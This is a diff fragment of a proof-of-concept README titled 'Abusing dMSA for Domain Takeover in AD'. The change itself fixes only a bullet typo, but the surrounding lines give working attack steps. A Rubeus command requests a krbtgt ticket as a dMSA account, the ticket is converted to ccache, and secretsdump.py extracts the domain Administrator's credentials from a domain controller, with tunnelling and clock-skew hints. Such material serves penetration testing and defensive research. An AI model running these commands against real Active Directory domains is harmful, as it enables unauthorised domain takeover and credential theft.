@@ -19,7 +19,7 @@ Abusing dMSA for Domain Takeover in AD
     - Finally, get the service ticket for some account with the dMSA account.
     `.\Rubeus.exe asktgs /targetuser:pwned_dmsa$ /service:krbtgt/<Domain - Ex: example.com> /nowrap /dmsa /opsec /ticket:<Base64 TGT from previous step> `
     ![](https://github.com/githubjerin/BadSuccessor-PoC/blob/main/assets/4.png)
--Convert the ticket obtained from the previous step to a .ccache file using any base64 to ccache converter.
+- Convert the ticket obtained from the previous step to a .ccache file using any base64 to ccache converter.
 ![](https://github.com/githubjerin/BadSuccessor-PoC/blob/main/assets/5.png)
 - Now just dump the secrets using the ticket obtained from the previous step (Hint: Use Ligolo if Kerberos ports are not exposed also use faketime if necessary).
 `secretsdump.py -k -no-pass <DC - Ex: DC01.example.com> -dc-ip 240.0.0.1 -target-ip 240.0.0.1 -just-dc-user Administrator`
